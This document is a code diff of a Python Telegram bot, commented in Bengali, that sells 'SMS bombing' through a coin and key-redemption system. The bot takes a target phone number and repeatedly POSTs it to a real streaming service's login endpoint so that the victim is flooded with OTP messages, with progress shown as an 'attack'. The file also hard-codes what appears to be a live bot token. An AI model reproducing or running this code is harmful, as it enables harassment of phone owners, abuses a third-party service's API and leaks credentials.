@@ -10,55 +10,65 @@ from datetime import datetime
 
 # --- কনফিগারেশন ---
 TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
-ADMIN_ID = 8504263842  # আপনার নতুন অ্যাডমিন আইডি
+ADMIN_ID = 8504263842 
 LOG_CHANNEL = "@sMsBotManagerDUModz" 
 REQUIRED_CHANNEL = "@DemoTestDUModz" 
 LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"
 
 bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")
 
-# --- ডেটাবেস হ্যান্ডলার ---
-def load_db(file):
-    if not os.path.exists(file):
-        with open(file, 'w') as f: json.dump({}, f)
+# --- পাওয়ারফুল ডেটাবেস সিস্টেম ---
+# এটি নিশ্চিত করে যে প্রতিবার ডেটা পরিবর্তন হলে তা ফাইলটিতে সেভ হবে।
+
+def load_db(filename):
+    if not os.path.exists(filename):
+        with open(filename, 'w') as f:
+            json.dump({}, f)
         return {}
     try:
-        with open(file, 'r') as f: return json.load(f)
-    except: return {}
+        with open(filename, 'r') as f:
+            return json.load(f)
+    except Exception as e:
+        print(f"Error loading {filename}: {e}")
+        return {}
 
-def save_db(file, data):
-    with open(file, 'w') as f:
-        json.dump(data, f, indent=4)
+def save_db(filename, data):
+    try:
+        with open(filename, 'w') as f:
+            json.dump(data, f, indent=4)
+    except Exception as e:
+        print(f"Error saving {filename}: {e}")
 
-# লোড ডাটা
-users = load_db('users.json')
-keys = load_db('keys.json')
+# গ্লোবাল ভেরিয়েবল হিসেবে ডাটাবেস লোড
+users_db = load_db('users.json')
+keys_db = load_db('keys.json')
 
-# --- ইউজার ম্যানেজমেন্ট ফাংশন ---
-def register_user(user):
+# --- ইউজার রেজিস্ট্রেশন ও আপডেট ফাংশন ---
+def update_user(user):
     uid = str(user.id)
-    name = user.first_name if user.first_name else "Unknown"
+    name = user.first_name if user.first_name else "No Name"
     username = f"@{user.username}" if user.username else "N/A"
     
-    if uid not in users:
-        users[uid] = {
+    # যদি নতুন ইউজার হয়
+    if uid not in users_db:
+        users_db[uid] = {
             "id": uid,
             "name": name,
             "username": username,
-            "status": "Free User",
-            "coins": 50,
-            "sent": 0,
-            "key_used": "None",
-            "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            "status": "Free",
+            "coins": 30, # প্রাথমিক গিফট কয়েন
+            "total_sent": 0,
+            "last_key_used": "None",
+            "last_active": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         }
-        bot.send_message(LOG_CHANNEL, f"🆕 **New User Registered:**\n👤 Name: {name}\n🆔 ID: `{uid}`")
     else:
-        # তথ্য আপডেট করা (যদি ইউজার নাম বা ইউজারনেম পরিবর্তন করে)
-        users[uid]["name"] = name
-        users[uid]["username"] = username
+        # পুরনো ইউজারের তথ্য আপডেট (নাম বা ইউজারনেম পরিবর্তন করলে)
+        users_db[uid]["name"] = name
+        users_db[uid]["username"] = username
+        users_db[uid]["last_active"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    save_db('users.json', users)
-    return users[uid]
+    save_db('users.json', users_db) # সাথে সাথে ফাইলে সেভ হবে
+    return users_db[uid]
 
 # --- ভেরিফিকেশন ---
 def is_joined(user_id):
@@ -67,13 +77,13 @@ def is_joined(user_id):
         return status in ['member', 'administrator', 'creator']
     except: return False
 
-# --- কিবোর্ড মেনু ---
-def main_menu():
+# --- মেনু ডিজাইন ---
+def get_main_markup():
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
         types.InlineKeyboardButton("🚀 Start SMS", callback_data="bomb"),
-        types.InlineKeyboardButton("👤 My Profile", callback_data="profile"),
-        types.InlineKeyboardButton("🔑 Use Key", callback_data="recharge"),
+        types.InlineKeyboardButton("👤 Profile", callback_data="profile"),
+        types.InlineKeyboardButton("🔑 Recharge", callback_data="recharge"),
         types.InlineKeyboardButton("📢 Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}")
     )
     return markup
@@ -81,168 +91,144 @@ def main_menu():
 # --- স্টার্ট কমান্ড ---
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
-    u_data = register_user(message.from_user)
+    u = update_user(message.from_user)
     
     if not is_joined(message.from_user.id):
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
-        markup.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
-        bot.send_photo(message.chat.id, LOGO_URL, caption="⚠️ **Access Denied!**\nPlease join our channel to use this bot.", reply_markup=markup)
+        markup.add(types.InlineKeyboardButton("✅ Check Joined", callback_data="verify"))
+        bot.send_photo(message.chat.id, LOGO_URL, caption="⚠️ **Verification Required!**\nPlease join our channel to use this bot.", reply_markup=markup)
         return
 
-    welcome_msg = (f"🔥 **Welcome, {u_data['name']}!**\n"
-                  f"━━━━━━━━━━━━━━━━━━━━\n"
-                  f"🆔 Your ID: `{u_data['id']}`\n"
-                  f"💰 Balance: `{u_data['coins']}` Coins\n"
-                  f"🚀 Total Sent: `{u_data['sent']}`\n"
-                  f"🏆 Rank: `{u_data['status']}`\n"
-                  f"━━━━━━━━━━━━━━━━━━━━\n"
-                  f"Choose an option to continue:")
-    bot.send_photo(message.chat.id, LOGO_URL, caption=welcome_msg, reply_markup=main_menu())
+    welcome_txt = (f"👋 **Welcome Back, {u['name']}!**\n\n"
+                  f"💰 Balance: `{u['coins']}` Coins\n"
+                  f"🚀 Total Sent: `{u['total_sent']}` SMS\n"
+                  f"🛡️ Account Type: `{u['status']}`\n\n"
+                  "আপনার অ্যাকাউন্টের সকল তথ্য সংরক্ষিত রয়েছে।")
+    bot.send_photo(message.chat.id, LOGO_URL, caption=welcome_txt, reply_markup=get_main_markup())
 
-# --- কলব্যাক কুয়েরি ---
+# --- কলব্যাক হ্যান্ডলার ---
 @bot.callback_query_handler(func=lambda call: True)
-def handle_callbacks(call):
+def callback_logic(call):
     uid = str(call.from_user.id)
-    u_data = register_user(call.from_user)
+    u = update_user(call.from_user)
 
     if call.data == "verify":
         if is_joined(call.from_user.id):
-            bot.answer_callback_query(call.id, "✅ Access Granted!")
+            bot.answer_callback_query(call.id, "✅ Success!")
             bot.delete_message(call.message.chat.id, call.message.message_id)
             start_cmd(call.message)
         else:
-            bot.answer_callback_query(call.id, "❌ Join first!", show_alert=True)
+            bot.answer_callback_query(call.id, "❌ Please Join First!", show_alert=True)
 
     elif call.data == "profile":
-        profile_text = (f"👤 **Your Advanced Profile**\n"
-                        f"━━━━━━━━━━━━━━━━━━━━\n"
-                        f"🆔 ID: `{uid}`\n"
-                        f"👤 Name: `{u_data['name']}`\n"
-                        f"📧 User: `{u_data['username']}`\n"
-                        f"💰 Balance: `{u_data['coins']}`\n"
-                        f"🚀 SMS Sent: `{u_data['sent']}`\n"
-                        f"🔑 Last Key: `{u_data['key_used']}`\n"
-                        f"🏆 Status: `{u_data['status']}`\n"
-                        f"📅 Joined: `{u_data['joined_at']}`")
-        bot.send_message(call.message.chat.id, profile_text)
-
-    elif call.data == "bomb":
-        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number:**")
-        bot.register_next_step_handler(msg, get_number)
+        text = (f"👤 **Your Stats**\n"
+                f"━━━━━━━━━━━━\n"
+                f"🆔 ID: `{uid}`\n"
+                f"💰 Balance: `{u['coins']}`\n"
+                f"🚀 Sent: `{u['total_sent']}`\n"
+                f"🔑 Last Key: `{u['last_key_used']}`\n"
+                f"🏆 Status: `{u['status']}`")
+        bot.send_message(call.message.chat.id, text)
 
     elif call.data == "recharge":
-        msg = bot.send_message(call.message.chat.id, "🔑 **Paste your key here:**")
-        bot.register_next_step_handler(msg, redeem_key)
+        msg = bot.send_message(call.message.chat.id, "🔑 **Enter Your Secret Key:**")
+        bot.register_next_step_handler(msg, process_recharge)
 
-    # --- অ্যাডমিন কলব্যাক ---
-    elif call.data.startswith("adm_"):
-        if int(uid) != ADMIN_ID: return
-        if call.data == "adm_stats":
-            total_u = len(users)
-            total_sent = sum(u['sent'] for u in users.values())
-            bot.send_message(call.message.chat.id, f"📊 **Bot Stats**\n\nUsers: {total_u}\nTotal SMS Sent: {total_sent}")
+    elif call.data == "bomb":
+        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (11 Digit):**")
+        bot.register_next_step_handler(msg, get_number)
 
-# --- এসএমএস লজিক ---
+# --- রিচার্জ লজিক (Key System) ---
+def process_recharge(message):
+    key = message.text.strip()
+    uid = str(message.from_user.id)
+    
+    if key in keys_db:
+        val = keys_db[key]
+        if val == "lifetime":
+            users_db[uid]['status'] = "Premium"
+        else:
+            users_db[uid]['coins'] += int(val)
+        
+        users_db[uid]['last_key_used'] = key
+        del keys_db[key] # কি একবার ব্যবহার হলে মুছে যাবে
+        
+        save_db('keys.json', keys_db)
+        save_db('users.json', users_db)
+        bot.send_message(message.chat.id, f"✅ **Recharge Successful!**\nNew Balance: `{users_db[uid]['coins']}`")
+    else:
+        bot.send_message(message.chat.id, "❌ **Invalid Key!** Please contact admin.")
+
+# --- এসএমএস বোম্বিং ইঞ্জিন ---
 def get_number(message):
     num = message.text
     if len(num) == 11 and num.isdigit():
-        msg = bot.send_message(message.chat.id, "🔢 **Enter Amount (1-100):**")
-        bot.register_next_step_handler(msg, lambda m: start_bombing(m, num))
+        msg = bot.send_message(message.chat.id, "🔢 **Enter Amount (Max 100):**")
+        bot.register_next_step_handler(msg, lambda m: start_attack(m, num))
     else: bot.send_message(message.chat.id, "❌ Invalid Number!")
 
-def start_bombing(message, num):
+def start_attack(message, num):
     try:
         amount = int(message.text)
         if amount > 100: amount = 100
         uid = str(message.from_user.id)
-        u_data = users[uid]
-        cost = amount * 2
-
-        if u_data['status'] != 'Premium' and u_data['coins'] < cost:
-            bot.send_message(message.chat.id, f"⚠️ Need {cost} coins!")
+        cost = amount * 1 # প্রতি এসএমএস ১ কয়েন
+        
+        if users_db[uid]['status'] != 'Premium' and users_db[uid]['coins'] < cost:
+            bot.send_message(message.chat.id, f"⚠️ Low Coins! Need {cost} coins.")
             return
 
-        progress = bot.send_message(message.chat.id, "🚀 **Attack Initiated...**")
-        threading.Thread(target=bombing_engine, args=(uid, num, amount, cost, progress)).start()
-    except: bot.send_message(message.chat.id, "❌ Invalid Input!")
+        p_msg = bot.send_message(message.chat.id, "🚀 **Initializing Attack...**")
+        threading.Thread(target=bombing, args=(uid, num, amount, cost, p_msg)).start()
+    except: bot.send_message(message.chat.id, "❌ Error!")
 
-def bombing_engine(uid, num, amount, cost, p_msg):
+def bombing(uid, num, amount, cost, p_msg):
     success = 0
-    api = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
+    # API: Bioscope
+    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
     
     for i in range(1, amount + 1):
         try:
-            r = requests.post(api, json={"number": "+88"+num}, timeout=5)
+            r = requests.post(url, json={"number": "+88"+num}, timeout=5)
             if r.status_code == 200: success += 1
             if i % 10 == 0:
                 bot.edit_message_text(f"🚀 **Bombing {num}...**\nProgress: `{i}/{amount}`", p_msg.chat.id, p_msg.message_id)
-            time.sleep(0.4)
+            time.sleep(0.5)
         except: pass
 
-    # ডাটা আপডেট
-    if users[uid]['status'] != 'Premium':
-        users[uid]['coins'] -= cost
-    users[uid]['sent'] += success
-    save_db('users.json', users)
+    # কয়েন ও ডেটা আপডেট (খুব গুরুত্বপূর্ণ)
+    if users_db[uid]['status'] != 'Premium':
+        users_db[uid]['coins'] -= cost
+    users_db[uid]['total_sent'] += success
+    save_db('users.json', users_db) # ডেটাবেসে স্থায়ীভাবে সেভ
 
     markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🔄 Attack Again", callback_data="bomb"))
-    bot.edit_message_text(f"✅ **Attack Summary**\n\n🎯 Target: `{num}`\n🚀 Sent: `{success}`\n💰 Cost: `{cost}` Coins", p_msg.chat.id, p_msg.message_id, reply_markup=markup)
+    markup.add(types.InlineKeyboardButton("🔄 Repeat Attack", callback_data="bomb"))
+    bot.edit_message_text(f"✅ **Attack Finished!**\n🎯 Target: `{num}`\n🚀 Successful: `{success}`\n💰 Balance Deducted: `{cost}` Coins", p_msg.chat.id, p_msg.message_id, reply_markup=markup)
 
-# --- কি সিস্টেম ---
-def redeem_key(message):
-    key = message.text.strip()
-    uid = str(message.from_user.id)
-    if key in keys:
-        val = keys[key]
-        if val == "lifetime":
-            users[uid]['status'] = "Premium"
-        else:
-            users[uid]['coins'] += int(val)
-        
-        users[uid]['key_used'] = key
-        del keys[key]
-        save_db('keys.json', keys)
-        save_db('users.json', users)
-        bot.send_message(message.chat.id, "🎉 **Key Success!** Coins/Premium added.")
-    else: bot.send_message(message.chat.id, "❌ Invalid Key!")
-
-# --- অ্যাডমিন কমান্ডস ---
-@bot.message_handler(commands=['admin'])
-def admin_panel(message):
-    if message.from_user.id != ADMIN_ID: return
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("📊 Stats", callback_data="adm_stats"))
-    markup.add(types.InlineKeyboardButton("🔑 Gen Key", callback_data="adm_gen"))
-    bot.send_message(message.chat.id, "👑 **Dark Unknown Admin Panel**", reply_markup=markup)
-
+# --- অ্যাডমিন কন্ট্রোলস ---
 @bot.message_handler(commands=['gen'])
 def gen_key(message):
     if message.from_user.id != ADMIN_ID: return
     try:
+        # /gen 500
         val = message.text.split()[1]
-        new_key = "DU-" + os.urandom(3).hex().upper()
-        keys[new_key] = val
-        save_db('keys.json', keys)
-        bot.reply_to(message, f"✅ **Generated:** `{new_key}`\nValue: `{val}`")
+        k = "DU-" + os.urandom(3).hex().upper()
+        keys_db[k] = val
+        save_db('keys.json', keys_db)
+        bot.reply_to(message, f"🔑 **Key:** `{k}`\n**Value:** {val}")
     except: bot.reply_to(message, "Usage: `/gen 500` or `/gen lifetime`")
 
-@bot.message_handler(commands=['broadcast'])
-def broadcast(message):
+@bot.message_handler(commands=['admin'])
+def admin_panel(message):
     if message.from_user.id != ADMIN_ID: return
-    msg_text = message.text.replace("/broadcast ", "")
-    count = 0
-    for user_id in users:
-        try:
-            bot.send_message(user_id, f"📢 **Announcement:**\n\n{msg_text}")
-            count += 1
-        except: pass
-    bot.reply_to(message, f"✅ Sent to {count} users.")
+    total_users = len(users_db)
+    bot.send_message(message.chat.id, f"👑 **Admin Dashboard**\n\n👥 Total Users: {total_users}\n💾 Database Status: `Stable ✅`")
 
-# --- রান বোট ---
+# --- বোট চালানো ---
 if __name__ == "__main__":
-    print(f"Bot started by Admin ID: {ADMIN_ID}")
+    print(f"Bot started as Admin ID: {ADMIN_ID}")
     while True:
         try:
             bot.infinity_polling(timeout=60, long_polling_timeout=30)
